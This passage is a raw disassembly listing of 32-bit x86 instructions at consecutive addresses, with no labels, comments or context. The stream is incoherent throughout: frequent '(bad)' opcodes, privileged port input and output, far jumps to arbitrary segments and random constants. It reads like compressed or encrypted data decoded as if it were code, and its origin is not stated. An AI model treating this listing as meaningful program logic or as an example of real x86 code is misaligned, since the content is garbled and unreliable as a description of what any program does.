  414cac:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414cad:	hlt    
  414cae:	pop    eax
  414caf:	bound  esp,QWORD PTR [ebx+0xd7ab14c]
  414cb5:	or     BYTE PTR [edx],bl
  414cb7:	dec    ecx
  414cb8:	shl    BYTE PTR [ebx-0x676d7622],0x18
  414cbf:	cmp    eax,0x8e4e3851
  414cc4:	jae    0x414cbb
  414cc6:	mov    ebx,0x6c19be9a
  414ccb:	adc    esi,esi
  414ccd:	lea    esp,[edi]
  414ccf:	les    esi,FWORD PTR [ebp-0x6]
  414cd2:	repz push ss
  414cd4:	xchg   esi,edx
  414cd6:	sbb    ch,ch
  414cd8:	dec    ebp
  414cd9:	adc    eax,0xeb0a143f
  414cde:	sar    DWORD PTR [edx+0x296bb168],0xbc
  414ce5:	inc    ebx
  414ce6:	jp     0x414d1d
  414ce8:	add    al,0x95
  414cea:	jmp    0xae7f:0xfc711e58
  414cf1:	jle    0x414d29
  414cf3:	push   ds
  414cf4:	or     BYTE PTR [ecx],0x90
  414cf7:	push   ds
  414cf8:	aam    0x0
  414cfa:	and    DWORD PTR [ebx],edi
  414cfc:	(bad)  [edx+0x5d94f82f]
  414d02:	aas    
  414d03:	int    0x7f
  414d05:	xor    dl,BYTE PTR [ebp+0x6e721957]
  414d0b:	out    dx,eax
  414d0c:	fcmove st,st(6)
  414d0e:	scas   al,BYTE PTR es:[edi]
  414d0f:	mov    ecx,0x9fb8455d
  414d14:	xchg   esi,eax
  414d15:	dec    esi
  414d16:	aas    
  414d17:	rol    DWORD PTR [ecx+0x248ef810],cl
  414d1d:	ins    BYTE PTR es:[edi],dx
  414d1e:	ja     0x414d7e
  414d20:	ja     0x414d5e
  414d22:	mov    cl,0xe8
  414d24:	xor    al,0xb1
  414d26:	scas   al,BYTE PTR es:[edi]
  414d27:	pushf  
  414d28:	in     eax,0x3a
  414d2a:	leave  
  414d2b:	sbb    ah,BYTE PTR [ecx-0x59]
  414d2e:	inc    ebx
  414d2f:	ins    DWORD PTR es:[edi],dx
  414d30:	pushf  
  414d31:	gs (bad) 
  414d33:	and    DWORD PTR [esi+0x36801680],esp
  414d39:	in     eax,dx
  414d3a:	push   ecx
  414d3b:	fbld   TBYTE PTR [ecx+0x70d85213]
  414d41:	and    ebx,DWORD PTR [esi+ebx*8-0x22]
  414d45:	xchg   BYTE PTR [edi+0x56],dl
  414d48:	xor    eax,0x6841708d
  414d4d:	inc    esi
  414d4e:	aam    0x42
  414d50:	mov    al,0xd5
  414d52:	pop    es
  414d53:	push   eax
  414d54:	pushf  
  414d55:	add    DWORD PTR [ebx],ebx
  414d57:	adc    BYTE PTR [edi-0x7e],dl
  414d5a:	mov    al,ds:0x134086b
  414d5f:	inc    eax
  414d60:	stos   BYTE PTR es:[edi],al
  414d61:	dec    ebx
  414d62:	pop    ds
  414d63:	je     0x414d35
  414d65:	ja     0x414dc5
  414d67:	mov    esp,0xc2bda10e
  414d6c:	retf   0x8bbe
  414d6f:	mov    ax,0x260d
  414d73:	lods   al,BYTE PTR ds:[esi]
  414d74:	mov    al,BYTE PTR [ebx]
  414d76:	(bad)  
  414d77:	jb     0x414d6e
  414d79:	inc    edi
  414d7a:	push   edx
  414d7b:	cmp    BYTE PTR [edi+0x558834bf],bh
  414d81:	icebp  
  414d82:	add    esi,ebp
  414d84:	loop   0x414db4
  414d86:	push   esi
  414d87:	(bad)  
  414d88:	mov    cl,0xdd
  414d8a:	dec    ebp
  414d8b:	pop    ds
  414d8c:	mov    esi,DWORD PTR [ebx]
  414d8e:	out    dx,al
  414d8f:	(bad)  
  414d90:	lods   al,BYTE PTR ds:[esi]
  414d91:	sub    al,0x59
  414d93:	adc    eax,DWORD PTR [edx-0x52c153b0]
  414d99:	or     DWORD PTR [eax-0x64],ebx
  414d9c:	mov    es,ebx
  414d9e:	mov    eax,ds:0xd710843e
  414da3:	sub    DWORD PTR [ebp-0x30a3d261],ebp
  414da9:	xor    DWORD PTR [edx],ecx
  414dab:	out    dx,eax
  414dac:	dec    ecx
  414dad:	rol    DWORD PTR [ebx+0xa],1
  414db0:	aas    
  414db1:	mov    ecx,0x89fb036f
  414db6:	xchg   ecx,eax
  414db7:	cmp    BYTE PTR [ecx-0x7a],bh
  414dba:	push   0x2
  414dbc:	xchg   esi,eax
  414dbd:	(bad)  
  414dbe:	mov    cl,0x96
  414dc0:	fild   DWORD PTR [edi+0x2a]
  414dc3:	jmp    0xa37073f7
  414dc8:	ror    DWORD PTR [esi-0x7e],1
  414dcb:	outs   dx,DWORD PTR ds:[esi]
  414dcc:	je     0x414e31
  414dce:	pop    edi
  414dcf:	cmp    BYTE PTR [ebx],0x2e
  414dd2:	(bad)  [esi-0x6c]
  414dd5:	push   eax
  414dd6:	popa   
  414dd7:	mov    DWORD PTR [edx+ecx*2],ecx
  414dda:	int3   
  414ddb:	inc    ebx
  414ddc:	add    bl,dh
  414dde:	pop    ebx
  414ddf:	xchg   dl,bh
  414de1:	cmp    dl,bh
  414de3:	dec    eax
  414de4:	mov    edi,0x8cb89ae6
  414de9:	push   0xb03e0e47
  414dee:	adc    al,0x7d
  414df0:	ret    
  414df1:	or     al,0x23
  414df3:	push   ebp
  414df4:	sahf   
  414df5:	push   ebx
  414df6:	push   esi
  414df7:	mov    ah,0xc0
  414df9:	xchg   esp,eax
  414dfa:	ss push cs
  414dfc:	std    
  414dfd:	stc    
  414dfe:	inc    esi
  414dff:	push   esp
  414e00:	rcl    ah,cl
  414e02:	cmp    eax,0xa73cc398
  414e07:	stos   BYTE PTR es:[edi],al
  414e08:	into   
  414e09:	cmc    
  414e0a:	cs sti 
  414e0c:	arpl   WORD PTR [ebx],dx
  414e0e:	hlt    
  414e0f:	push   es
  414e10:	loop   0x414e21
  414e12:	pusha  
  414e13:	adc    esp,0xffffff8e
  414e16:	clc    
  414e17:	mov    dl,0x27
  414e19:	xor    edx,esp
  414e1b:	jbe    0x414de9
  414e1d:	adc    BYTE PTR [edi],bl
  414e1f:	jl     0x414e51
  414e21:	loop   0x414db9
  414e23:	sbb    al,BYTE PTR [eax+0x6c]
  414e26:	cmp    DWORD PTR [ecx],esp
  414e28:	mov    dl,dl
  414e2a:	sbb    DWORD PTR [ebx+edi*2+0x6f],edi
  414e2e:	(bad)  
  414e2f:	mov    WORD PTR [edx-0x24],gs
  414e32:	inc    edx
  414e33:	jecxz  0x414db8
  414e35:	lock repnz cmp esi,DWORD PTR [edi-0x1f]
  414e3a:	das    
  414e3b:	fstp   TBYTE PTR [ebx+0x2e54fa5f]
  414e41:	out    dx,al
  414e42:	add    al,0xf4
  414e44:	sub    bl,BYTE PTR [eax]
  414e46:	rcr    ecx,cl
  414e48:	and    BYTE PTR [ebx-0x5bab00d1],cl
  414e4e:	je     0x414e63
  414e50:	or     eax,0xf0248896
  414e55:	rcr    BYTE PTR [edx+0x2eca7bd8],0xc7
  414e5c:	jp     0x414e0f
  414e5e:	inc    esi
  414e5f:	sar    DWORD PTR [ebx-0x367f2d01],0x15
  414e66:	dec    ecx
  414e67:	loope  0x414e85
  414e69:	sbb    BYTE PTR [ecx+0x71e563e8],dh
  414e6f:	repz add eax,0xdce93a08
  414e75:	mov    bl,0xd5
  414e77:	cmc    
  414e78:	mov    WORD PTR [eax+0xa],fs
  414e7b:	mov    esi,0x645677f
  414e80:	(bad)
  414e84:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414e85:	ds mov ebp,0x6ce885e4
  414e8b:	pop    ebx
  414e8c:	mov    cl,0xcd
  414e8e:	dec    ebx
  414e8f:	lahf   
  414e90:	sbb    BYTE PTR [edi+0x6f],0xb4
  414e94:	stc    
  414e95:	xor    eax,0x6b12f45
  414e9a:	stos   BYTE PTR es:[edi],al
  414e9b:	das    
  414e9c:	ins    DWORD PTR es:[edi],dx
  414e9d:	or     BYTE PTR [eax+0x52],cl
  414ea0:	pop    edx
  414ea1:	cmp    esp,DWORD PTR [ebp+0x15]
  414ea4:	cmp    DWORD PTR [ebp+0x7],edx
  414ea7:	push   ecx
  414ea8:	or     al,0x21
  414eaa:	cmp    edx,DWORD PTR [ebx-0x48]
  414ead:	xor    esi,DWORD PTR [ebx+ecx*4]
  414eb0:	fs push 0xffffff8b
  414eb3:	jo     0x414e6a
  414eb5:	adc    BYTE PTR [edx+0x7f],0x72
  414eb9:	sahf   
  414eba:	popa   
  414ebb:	(bad)  
  414ebc:	fmul   DWORD PTR [eax]
  414ebe:	sahf   
  414ebf:	jp     0x414e82
  414ec1:	mov    al,0x27
  414ec3:	leave  
  414ec4:	xchg   ebx,ebp
  414ec6:	dec    ebp
  414ec7:	adc    ch,0xab
  414eca:	(bad)  
  414ecb:	out    0x8c,al
  414ecd:	add    esp,eax
  414ecf:	out    dx,al
  414ed0:	dec    eax
  414ed1:	rol    bl,1
  414ed3:	jmp    0x2164:0x19207d50
  414eda:	or     eax,0xab2f4218
  414edf:	xor    eax,0x30ed8ed1
  414ee4:	jmp    0xb07a:0xeae0d43a
  414eeb:	and    BYTE PTR ds:0x768e7395,bh
  414ef1:	sub    eax,0x432f8bff
  414ef6:	stc    
  414ef7:	stc    
  414ef8:	mov    WORD PTR [edi-0x75],fs
  414efb:	or     BYTE PTR [edi],ch
  414efd:	rcr    BYTE PTR [ecx-0x51],0x34
  414f01:	xor    esp,DWORD PTR [edx+0x71a15a1f]
  414f07:	daa    
  414f08:	shr    dh,0xcb
  414f0b:	inc    ebx
  414f0c:	dec    ebp
  414f0d:	push   cs
  414f0e:	dec    ecx
  414f0f:	test   eax,0x2642a006
  414f14:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414f15:	imul   esp,DWORD PTR [esi],0x3c
  414f18:	int3   
  414f19:	cdq    
  414f1a:	leave  
  414f1b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414f1c:	xchg   edx,eax
  414f1d:	push   ecx
  414f1e:	cmp    BYTE PTR [edi],bh
  414f20:	xor    dl,BYTE PTR [ecx-0x75164d53]
  414f26:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414f27:	mov    bl,0x41
  414f29:	imul   ebp,DWORD PTR [ecx+0xc],0x1beb5d7f
  414f30:	add    BYTE PTR [esp+edi*1-0x77],cl
  414f34:	jl     0x414f43
  414f36:	stc    
  414f37:	ret    
  414f38:	in     al,0x38
  414f3a:	mov    bl,BYTE PTR [ecx+0x65]
  414f3d:	xor    al,0x2c
  414f3f:	test   al,0xd3
  414f41:	xchg   esp,eax
  414f42:	(bad)
  414f46:	rcl    DWORD PTR ss:[ecx+0x7c9dd623],1
  414f4d:	test   DWORD PTR [ecx],0x7d969378
  414f53:	lods   eax,DWORD PTR ds:[esi]
  414f54:	pop    esp
  414f55:	and    eax,0xec96094d
  414f5a:	xor    cl,BYTE PTR [esi+eiz*4+0x6e]
  414f5e:	les    eax,FWORD PTR [esi+0x5a]
  414f61:	shr    BYTE PTR [ecx+0x1c8e96b6],cl
  414f67:	loope  0x414f88
  414f69:	or     al,0x29
  414f6b:	ja     0x414fc4
  414f6d:	call   0xcda758c4
  414f72:	fwait
  414f73:	cmps   WORD PTR ds:[esi],WORD PTR es:[edi]
  414f75:	add    DWORD PTR [esi+0x8],ebp
  414f78:	or     eax,edi
  414f7a:	mov    ecx,0x43b472df
  414f7f:	add    BYTE PTR ds:0xd3e9f851,ch
  414f85:	adc    ebp,DWORD PTR [ebx]
  414f87:	mul    DWORD PTR [eax+0x12e3331e]
  414f8d:	add    al,0x9d
  414f8f:	dec    ebp
  414f90:	adc    DWORD PTR [ebx+0x50],esp
  414f93:	mov    ds:0xaa0107b,eax
  414f98:	or     ebx,eax
  414f9a:	mov    edi,0x971f4fda
  414f9f:	push   edi
  414fa0:	repz es out 0x74,al
  414fa4:	xor    DWORD PTR [eax-0x51ee6f7b],esp
  414faa:	push   0xffffffae
  414fac:	adc    eax,0x5789b32d
  414fb1:	add    al,0x5d
  414fb3:	jmp    0xb834c7c
  414fb8:	ror    DWORD PTR [ebx+0x50a70165],cl
  414fbe:	les    ebp,FWORD PTR [esi]
  414fc0:	(bad)  
  414fc1:	jge    0x414fd9
  414fc3:	add    dh,BYTE PTR [esi+0x3e]
  414fc6:	popa   
  414fc7:	sahf   
  414fc8:	cmp    BYTE PTR [ebx+edx*1+0x7666268b],dh
  414fcf:	pop    ds
  414fd0:	ins    DWORD PTR es:[edi],dx
  414fd1:	inc    BYTE PTR [eax-0x4b21b652]
  414fd7:	mov    dl,0xfd
  414fd9:	(bad)  
  414fda:	mov    al,ds:0x259541a9
  414fdf:	sub    eax,0xde6087bc
  414fe4:	clc    
  414fe5:	imul   eax,eax,0x55588588
  414feb:	sub    BYTE PTR [ecx+ebp*4],dh
  414fee:	(bad)  
  414fef:	jno    0x414f7a
  414ff1:	mov    ebp,0x30718b7c
  414ff6:	fndisi(8087 only) 
  414ff8:	xor    al,0x6a
  414ffa:	pop    eax
  414ffb:	call   0xd1581755
  415000:	mov    ds:0x4c55ab02,eax
  415005:	cs loopne 0x415074
  415008:	add    BYTE PTR [edi-0x31],dl
  41500b:	push   esp
  41500c:	out    0xe,al
  41500e:	pop    ebx
  41500f:	dec    ecx
  415010:	std    
  415011:	pop    ebx
  415012:	cwde   
  415013:	mov    WORD PTR [eax+0x21],gs
  415016:	mov    eax,ds:0x6a1d18ed
  41501b:	nop
  41501c:	sar    DWORD PTR [edx],0x2d
  41501f:	neg    DWORD PTR [edi-0xe]
  415022:	(bad)  
  415023:	mov    DWORD PTR [ebx],ebx
  415025:	jmp    0x342d:0x6c4118f3
  41502c:	mov    edx,0x4acf838
  415031:	xchg   ecx,eax
  415032:	inc    edx
  415033:	adc    BYTE PTR [ebx],cl
  415035:	stc    
  415036:	push   edi
  415037:	or     BYTE PTR [esi-0x4d6fe63c],dh
  41503d:	scas   eax,DWORD PTR es:[edi]
  41503e:	push   ebx
  41503f:	(bad)  
  415040:	mov    eax,ds:0x4378f2ee
  415045:	mov    bh,0x48
  415047:	jnp    0x414fe4
  415049:	cmp    ah,BYTE PTR [ecx-0x77]
  41504c:	scas   al,BYTE PTR es:[edi]
  41504d:	xchg   ebp,eax
  41504e:	push   ebx
  41504f:	test   eax,0xdab3ce5
  415054:	ror    edi,1
  415056:	mov    eax,0x53c0d75b
  41505b:	mov    ds,WORD PTR [esi-0xb]
  41505e:	jp     0x4150d5
  415060:	out    dx,al
  415061:	ret    
  415062:	pop    ebp
  415063:	add    al,0x51
  415065:	loop   0x4150a4
  415067:	push   ebp
  415068:	lods   eax,DWORD PTR ds:[esi]
  415069:	hlt    
  41506a:	lds    esp,FWORD PTR [esi+0x64251ba8]
  415070:	ins    BYTE PTR es:[edi],dx
  415071:	shl    DWORD PTR [edx],1
  415073:	xchg   ecx,eax
  415074:	mov    eax,ds:0x135f6ac
  415079:	xor    al,BYTE PTR [edi+ecx*8]
  41507c:	sti    
  41507d:	clc    
  41507e:	push   0x630a390e
  415083:	push   ss
  415084:	(bad)  
  415085:	ins    BYTE PTR es:[edi],dx
  415086:	xchg   ecx,eax
  415087:	cld    
  415088:	fcomip st,st(6)
  41508a:	int3   
  41508b:	aaa    
  41508c:	ret    0x3355
  41508f:	cli    
  415090:	sbb    BYTE PTR [edi-0x982e75a],cl
  415096:	mov    ebx,0xaf86d0d0
  41509b:	(bad)  
  41509c:	mov    ch,0x31
  41509e:	int    0xf
  4150a0:	mov    eax,0x8b7b86d
  4150a5:	mov    esi,0x49a6e39c
  4150aa:	cdq    
  4150ab:	and    eax,0x9a6336bf
  4150b0:	push   ds
  4150b1:	pop    ebp
  4150b2:	or     DWORD PTR [eax+0x3d606bbe],esp
  4150b8:	aam    0x11
  4150ba:	dec    eax
  4150bb:	mov    edi,0x64b4fcd9
  4150c0:	stos   DWORD PTR es:[edi],eax
  4150c1:	mov    eax,ds:0x61fd2d8f
  4150c6:	mov    edi,0x743b0dfa
  4150cb:	out    dx,eax
  4150cc:	xor    ebx,ecx
  4150ce:	in     eax,0x13
  4150d0:	imul   ecx,DWORD PTR [esi+0xd],0x658c9cfd
  4150d7:	out    0xb6,al
  4150d9:	inc    eax
  4150da:	dec    edi
  4150db:	dec    esi
  4150dc:	sub    DWORD PTR es:[ebx],ebx
  4150df:	xor    BYTE PTR [ecx+0x5c6b25c1],0xb5
  4150e6:	mov    cl,0xe4
  4150e8:	xchg   BYTE PTR [esi+0x50],bl
  4150eb:	sub    al,0xb9
  4150ed:	test   eax,0x9c33aa69
  4150f2:	ds jmp 0xd479:0xf950c1a6
  4150fa:	jno    0x41508c
  4150fc:	mov    eax,ds:0x7f053a5d
  415101:	pop    ebx
  415102:	xchg   edi,eax
  415103:	inc    ecx
  415104:	sbb    al,0xf0
  415106:	xor    BYTE PTR [esi],cl
  415108:	push   esi
  415109:	xchg   esp,eax
  41510a:	jne    0x415137
  41510c:	inc    eax
  41510d:	stc    
  41510e:	jno    0x415184
  415110:	std    
  415111:	div    BYTE PTR [edx+eax*8]
  415114:	mov    dl,0x6b
  415116:	repnz mov cl,0xc3
  415119:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41511a:	scas   al,BYTE PTR es:[edi]
  41511b:	arpl   WORD PTR [ebx],dx
  41511d:	adc    eax,0xbef354f9
  415122:	movq   mm6,mm1
  415125:	not    DWORD PTR [eax]
  415127:	xchg   edi,eax
  415128:	and    BYTE PTR [eax],0xa4
  41512b:	dec    ebp
  41512c:	jnp    0x41516a
  41512e:	int    0x9
  415130:	lahf   
  415131:	test   esi,edx
  415133:	fdivp  st(4),st
  415135:	repnz fisttp DWORD PTR [eax-0x48]
  415139:	cmp    eax,0x8040bb64
  41513e:	test   dh,bl
  415140:	mov    dl,0x49
  415142:	push   esi
  415143:	adc    BYTE PTR [edi],dl
  415145:	out    dx,eax
  415146:	xchg   ecx,eax
  415147:	dec    edx
  415148:	dec    ebp
  415149:	jg     0x4151a7
  41514b:	sub    cl,bh
  41514d:	js     0x415158
  41514f:	lock add edi,DWORD PTR [ebx+0x51]
  415153:	jmp    0x829265e8
  415158:	fcomp  QWORD PTR [edi]
  41515a:	stos   BYTE PTR es:[edi],al
  41515b:	inc    ebp
  41515c:	push   ebp
  41515d:	popa   
  41515e:	test   al,0xdc
  415160:	add    ebp,DWORD PTR [ecx+0x3e80541d]
  415166:	out    0xdb,eax
  415168:	ins    DWORD PTR es:[edi],dx
  415169:	pop    esp
  41516a:	pop    esp
  41516b:	and    ecx,DWORD PTR [ebx-0x1f]
  41516e:	pop    ebx
  41516f:	dec    esp
  415170:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415171:	enter  0xacfe,0xd
  415175:	iret   
  415176:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415177:	jge    0x415149
  415179:	popf   
  41517a:	mov    eax,DWORD PTR [ecx]
  41517c:	cmp    BYTE PTR [edx+0x7f29dffb],al
  415182:	sbb    eax,ebp
  415184:	sub    eax,0x9d5d2efc
  415189:	vpor   xmm5,xmm3,XMMWORD PTR fs:[ebp+0x2]
  41518f:	xchg   ecx,eax
  415190:	in     al,0x16
  415192:	mov    BYTE PTR [ecx],bl
  415194:	clc    
  415195:	rol    BYTE PTR [ebx],0xfd
  415198:	fistp  DWORD PTR [ecx]
  41519a:	inc    edx
  41519b:	xor    BYTE PTR [ecx],cl
  41519d:	xor    eax,0xa3e750b1
  4151a2:	sti    
  4151a3:	mov    DWORD PTR [ecx+edi*8],ebp
  4151a6:	cmp    dl,BYTE PTR [edi-0x30]
  4151a9:	adc    edx,DWORD PTR [eax+ebx*1]
  4151ac:	jnp    0x4151a8
  4151ae:	mov    esi,0x799aa150
  4151b3:	enter  0x5c81,0x29
  4151b7:	jge    0x4151d5
  4151b9:	stos   BYTE PTR es:[edi],al
  4151ba:	pop    ebx
  4151bb:	addr16 fwait
  4151bd:	ja     0x415180
  4151bf:	pop    ebx
  4151c0:	add    ebx,DWORD PTR [ecx+edx*4-0x53]
  4151c4:	lahf   
  4151c5:	and    BYTE PTR [bp+di],cl
  4151c8:	aas    
  4151c9:	aad    0x5d
  4151cb:	in     eax,0xe0
  4151cd:	ret    
  4151ce:	or     al,0x18
  4151d0:	sbb    BYTE PTR [edi-0xeca36a7],bl
  4151d6:	fmul   QWORD PTR [edx-0x76039880]
  4151dc:	popa   
  4151dd:	or     BYTE PTR [ebp+0x4a],ch
  4151e0:	fdiv   DWORD PTR [eax+0x67]
  4151e3:	push   esp
  4151e4:	sahf   
  4151e5:	(bad)  
  4151e6:	in     eax,dx
  4151e7:	or     dh,ch
  4151e9:	inc    ecx
  4151ea:	out    0xa1,al
  4151ec:	xor    ah,dh
  4151ee:	xchg   ch,bl
  4151f0:	std    
  4151f1:	repnz sti 
  4151f3:	and    ebx,DWORD PTR [edi-0x45]
  4151f6:	lods   al,BYTE PTR ds:[esi]
  4151f7:	add    edx,DWORD PTR [eax]
  4151f9:	mov    ebp,0x119a5064
  4151fe:	mov    al,0x8f
  415200:	xchg   ecx,eax
  415201:	pusha  
  415202:	fbstp  TBYTE PTR [edi]
  415204:	fisubr WORD PTR [ecx]
  415206:	les    eax,FWORD PTR [edx]
  415208:	cmp    BYTE PTR [edi+0x2da3fbc0],ch
  41520e:	sbb    DWORD PTR [eax+0x500ae723],0xcfdcc915
  415218:	add    BYTE PTR [ebp+0x6a562c5c],dh
  41521e:	mov    ?,WORD PTR [esi-0x5734fc46]
  415224:	imul   BYTE PTR ds:0xcae70e6e
  41522a:	adc    al,0xb
  41522c:	movs   DWORD PTR es:[edi],DWORD PTR cs:[esi]
  41522e:	xor    eax,0x32419e39
  415233:	neg    BYTE PTR [ebp-0x460250fe]
  415239:	bswap  esp
  41523b:	push   ecx
  41523c:	mov    al,0xed
  41523e:	jbe    0x415232
  415240:	hlt    
  415241:	mov    edi,0x15d2a847
  415246:	lahf   
  415247:	sub    eax,0x97ec6d00
  41524c:	fs retf 
  41524e:	adc    ecx,DWORD PTR [bp+di-0x734e]
  415253:	xchg   edi,eax
  415254:	test   BYTE PTR [eax+0x74c1e019],bh
  41525a:	lahf   
  41525b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41525c:	pop    edi
  41525d:	mov    esp,0xc4daac62
  415262:	inc    ebp
  415263:	cld    
  415264:	push   eax
  415265:	adc    DWORD PTR ds:0x5d6d194b,ebp
  41526b:	sub    eax,0x1982f41c
  415270:	repz mov eax,0x6cba9b26
  415276:	inc    edx
  415277:	scas   al,BYTE PTR es:[edi]
  415278:	sbb    edi,edx
  41527a:	pop    ss
  41527b:	fs addr16 pusha 
  41527e:	data16 addr16 mov ah,0x5a
  415282:	arpl   WORD PTR [edx],cx
  415284:	inc    esi
  415285:	mov    fs,WORD PTR [esi]
  415287:	adc    ch,BYTE PTR [ecx+0x70061ea2]
  41528d:	cmp    al,0xa
  41528f:	jbe    0x4152e3
  415291:	jl     0x41522e
  415293:	add    al,BYTE PTR [esi+0x41]
  415296:	in     al,dx
  415297:	push   es
  415298:	out    0x62,eax
  41529a:	call   0xb4bf:0x788a2666
  4152a1:	loop   0x41525d
  4152a3:	cdq    
  4152a4:	out    dx,al
  4152a5:	adc    BYTE PTR [edx+0x36449612],0xe2
  4152ac:	je     0x415253
  4152ae:	gs hlt 
  4152b0:	into   
  4152b1:	in     eax,0xc4
  4152b3:	into   
  4152b4:	fidivr DWORD PTR [edi+0x2200e57f]
  4152ba:	test   eax,0x6aeec3a8
  4152bf:	add    BYTE PTR [eax-0x41],bl
  4152c2:	ja     0x4152c1
  4152c4:	add    DWORD PTR [ebp+0x72],esi
  4152c7:	fwait
  4152c8:	and    eax,DWORD PTR ds:0x502f76f
  4152ce:	cmp    dh,dh
  4152d0:	ret    
  4152d1:	cs sub al,0x98
  4152d4:	adc    cl,al
  4152d6:	outs   dx,BYTE PTR ds:[esi]
  4152d7:	or     al,0x42
  4152d9:	leave  
  4152da:	mov    al,ds:0x14a59d44
  4152df:	pop    ds
  4152e0:	pop    ebp
  4152e1:	sbb    cl,cl
  4152e3:	dec    ebp
  4152e4:	out    dx,eax
  4152e5:	aam    0xc5
  4152e7:	jae    0x4152f9
  4152e9:	pop    esp
  4152ea:	(bad)  
  4152eb:	sahf   
  4152ec:	adc    eax,DWORD PTR [esi+0x59]
  4152ef:	xchg   BYTE PTR [ebp+0xc],bh
  4152f2:	retf   
  4152f3:	xor    bh,BYTE PTR [eax-0x2f]
  4152f6:	sbb    DWORD PTR [ebx-0x161d27a6],0x7ff253ff
  415300:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415301:	dec    edi
  415302:	and    DWORD PTR [esi+0x33492ab0],ecx
  415308:	retf   
  415309:	iret   
  41530a:	retf   
  41530b:	mov    esi,0x5724b688
  415310:	lock adc dl,dl
  415313:	scas   al,BYTE PTR es:[edi]
  415314:	xchg   BYTE PTR [edx-0x51],dh
  415317:	and    BYTE PTR [esi],ah
  415319:	mov    cl,0x9c
  41531b:	mov    ebx,0x6ef5246b
  415320:	jb     0x415337
  415322:	hlt    
  415323:	push   0x5d
  415325:	call   0xb9c573fd
  41532a:	mov    BYTE PTR [ebp+0x5084629],bh
  415330:	inc    esi
  415331:	sub    bl,bh
  415333:	inc    ecx
  415334:	cmp    al,0x5a
  415336:	sub    al,BYTE PTR [edx-0x35]
  415339:	rcl    DWORD PTR [ebx],0xd1
  41533c:	push   ecx
  41533d:	xchg   esp,eax
  41533e:	sub    eax,0xa84c56b1
  415343:	and    al,BYTE PTR [edi+esi*8-0x5c]
  415347:	test   al,0x86
  415349:	lock sub al,0xc4
  41534c:	pop    edi
  41534d:	jne    0x415398
  41534f:	inc    esp
  415350:	frstor [edi+0x474b15cd]
  415356:	std    
  415357:	aas    
  415358:	add    DWORD PTR [edi-0x25],ebx
  41535b:	ficomp DWORD PTR [edi-0x59b156cb]
  415361:	repnz or DWORD PTR [edx+0x5c],ebx
  415365:	repz cld 
  415367:	and    DWORD PTR [ebp+0x3c],0xd21227ab
  41536e:	lahf   
  41536f:	sbb    BYTE PTR [ebp+0x17a79c84],bl
  415375:	lods   al,BYTE PTR ds:[esi]
  415376:	in     eax,dx
  415377:	outs   dx,DWORD PTR ds:[esi]
  415378:	cmp    eax,0xd2267aa0
  41537d:	aad    0xe3
  41537f:	adc    BYTE PTR [eax+0xc7e51bc],cl
  415385:	jno    0x41532a
  415387:	in     al,0xfc
  415389:	pop    esi
  41538a:	sbb    ch,BYTE PTR [esi+0x63b7d460]
  415390:	jno    0x415359
  415392:	adc    DWORD PTR [eax+0x427ce4cb],edi
  415398:	xor    bh,BYTE PTR [esi-0x4d]
  41539b:	sub    DWORD PTR ds:0xd2bbd6f2,0x0
  4153a2:	ret    0x8e7f
  4153a5:	(bad)  
  4153a7:	xor    dl,BYTE PTR [ebp+0xb]
  4153aa:	lds    edx,FWORD PTR [ecx]
  4153ac:	(bad)  
  4153ad:	retf   
  4153ae:	push   eax
  4153b0:	sbb    esp,esp
  4153b2:	sub    eax,0xfa0cef51
  4153b7:	and    eax,0xcacaf941
  4153bc:	ficom  WORD PTR [ecx]
  4153be:	mov    BYTE PTR [ecx+ebx*2+0x58],bl
  4153c2:	das    
  4153c3:	fcmovnbe st,st(5)
  4153c5:	sbb    cl,BYTE PTR [ecx-0x25]
  4153c8:	out    0x6e,al
  4153ca:	bound  edi,QWORD PTR [eax]
  4153cc:	and    BYTE PTR [ebp+0x423f7443],ah
  4153d2:	ins    BYTE PTR es:[edi],dx
  4153d3:	call   0xa2af:0x4db6d7bc
  4153da:	ret    0xd84c
  4153dd:	jbe    0x415378
  4153df:	imul   DWORD PTR [ebx]
  4153e1:	fcomp  DWORD PTR [edi-0x2a3163ad]
  4153e7:	sbb    BYTE PTR [ebx-0xe],bl
  4153ea:	inc    ebp
  4153eb:	and    DWORD PTR [esi-0x7a],esp
  4153ee:	fistp  WORD PTR [edi-0x2a0ffad2]
  4153f4:	ins    DWORD PTR es:[edi],dx
  4153f5:	pop    eax
  4153f6:	lea    esp,[edx-0x1]
  4153f9:	dec    esp
  4153fa:	inc    ecx
  4153fb:	xor    esp,ebx
  4153fd:	or     DWORD PTR [esi+0x34],esi
  415400:	daa    
  415401:	ret    0x29ba
  415404:	mov    eax,0x871d56bb
  415409:	repz push 0xffffffee
  41540c:	stos   BYTE PTR es:[edi],al
  41540d:	mov    edx,0x76668d7
  415412:	out    dx,al
  415413:	add    edx,edi
  415415:	pop    cx
  415417:	shr    DWORD PTR [edi],cl
  415419:	mov    ?,ebx
  41541b:	cwde   
  41541c:	or     cl,BYTE PTR [eax]
  41541e:	jge    0x415496
  415420:	dec    esp
  415421:	inc    eax
  415422:	ss loopne 0x415484
  415425:	repnz inc ebx
  415427:	xor    eax,0x3c7063bf
  41542c:	mov    BYTE PTR [esi+0x1f],ch
  41542f:	lods   al,BYTE PTR ds:[esi]
  415430:	xor    edi,DWORD PTR [ecx-0x8]
  415433:	mov    esi,ebx
  415435:	jnp    0x4153e5
  415437:	in     al,0xf3
  415439:	xchg   esi,eax
  41543a:	aaa    
  41543b:	fcomip st,st(6)
  41543d:	dec    edi
  41543e:	test   BYTE PTR [esi-0x6c],ah
  415441:	sti    
  415442:	and    DWORD PTR [ebx],ecx
  415444:	dec    esp
  415445:	sub    BYTE PTR [esi+0x37],0x39
  415449:	je     0x415438
  41544b:	ror    DWORD PTR ds:0xcad8033,cl
  415451:	test   al,0xc
  415453:	xchg   BYTE PTR [edi+edx*1],cl
  415456:	adc    al,0xa3
  415458:	add    BYTE PTR [ecx],bh
  41545a:	lods   al,BYTE PTR ds:[esi]
  41545b:	push   ss
  41545c:	lock sub bh,ch
  41545f:	or     DWORD PTR [ebp-0xa],0xb844e4e3
  415466:	push   0xffffffc8
  415468:	inc    ebx
